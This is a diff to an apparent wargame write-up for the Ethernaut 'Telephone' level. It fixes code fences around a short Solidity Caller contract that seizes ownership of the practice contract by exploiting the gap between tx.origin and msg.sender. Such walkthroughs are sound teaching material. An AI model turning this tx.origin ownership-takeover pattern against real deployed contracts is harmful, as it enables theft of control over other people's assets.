@@ -62,7 +62,7 @@ Then just call the 'attack()' function 10 times (wait some time between each cal
 
 ## Lvl-4 Telephone
 Simply make a contract that calls 'changeOwner()' while passing the msg.sender of your address as the arguments.
-`
+```
 pragma solidity 0.6.0;
 contract Caller {
     Telephone telephone = Telephone(YOUR_INSTANCE_ADD);
@@ -71,7 +71,6 @@ contract Caller {
         telephone.changeOwner(msg.sender);
     }
 }
-
-`
+```
 The tx.origin will be your metamask address, the msg.sender will be your Caller contract, and therefore you will pass the check on the first line of 'changeOwner()'.
 
